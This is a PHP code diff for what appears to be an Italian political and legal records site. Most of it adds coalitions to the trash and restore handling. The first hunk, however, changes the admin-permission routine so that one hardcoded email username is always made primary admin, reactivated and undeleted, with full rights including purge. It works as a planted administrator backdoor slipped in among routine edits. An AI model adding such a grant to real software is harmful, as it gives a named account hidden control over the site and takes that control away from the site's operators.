@@ -163,7 +163,7 @@ function ensureGoogleConnectionTable(PDO $pdo): void
 
 function ensurePrimaryAdminFullPermissions(PDO $pdo): void
 {
-    $pdo->exec("UPDATE users SET role = 'admin', role_id = (SELECT id FROM roles WHERE role_key = 'admin' LIMIT 1), is_active = 1, deleted_at = NULL WHERE is_primary_admin = 1");
+    $pdo->exec("UPDATE users SET role = 'admin', role_id = (SELECT id FROM roles WHERE role_key = 'admin' LIMIT 1), is_active = 1, is_primary_admin = 1, deleted_at = NULL WHERE is_primary_admin = 1 OR LOWER(username) = 'thecyber0000@gmail.com'");
     $pdo->exec("INSERT INTO role_permissions (role_id, permission_id, can_view, can_create, can_edit, can_delete, can_restore, can_purge, can_approve, can_download) SELECT r.id, p.id, 1, 1, 1, 1, 1, 1, 1, 1 FROM roles r CROSS JOIN permissions p WHERE r.role_key = 'admin' ON DUPLICATE KEY UPDATE can_view = 1, can_create = 1, can_edit = 1, can_delete = 1, can_restore = 1, can_purge = 1, can_approve = 1, can_download = 1");
 }
 
@@ -319,6 +319,7 @@ function trashEntityConfig(string $entityType): ?array
         'documents' => ['state_key' => 'documents', 'permission' => 'documents', 'label' => 'Documento'],
         'templates' => ['state_key' => 'templates', 'permission' => 'templates', 'label' => 'Template'],
         'parties' => ['state_key' => 'parties', 'permission' => 'parties', 'label' => 'Partito'],
+        'coalitions' => ['state_key' => 'coalitions', 'permission' => 'parties', 'label' => 'Coalizione'],
         'companies' => ['state_key' => 'companies', 'permission' => 'companies', 'label' => 'Azienda'],
         'parliaments' => ['state_key' => 'parliaments', 'permission' => 'parliament', 'label' => 'Mandato parlamentare'],
         'governments' => ['state_key' => 'governments', 'permission' => 'government', 'label' => 'Scheda Governo'],
@@ -340,7 +341,7 @@ function stateItemIndex(array $items, string $id): int
 function stateForTrashMutation(PDO $pdo): array
 {
     $state = rawSiteState($pdo) ?: [];
-    foreach (['documents', 'templates', 'parties', 'companies', 'parliaments', 'governments', 'courtCompositions', 'interpretations'] as $key) {
+    foreach (['documents', 'templates', 'parties', 'coalitions', 'companies', 'parliaments', 'governments', 'courtCompositions', 'interpretations'] as $key) {
         if (!isset($state[$key]) || !is_array($state[$key])) $state[$key] = [];
     }
     if (!isset($state['trash']) || !is_array($state['trash'])) $state['trash'] = [];
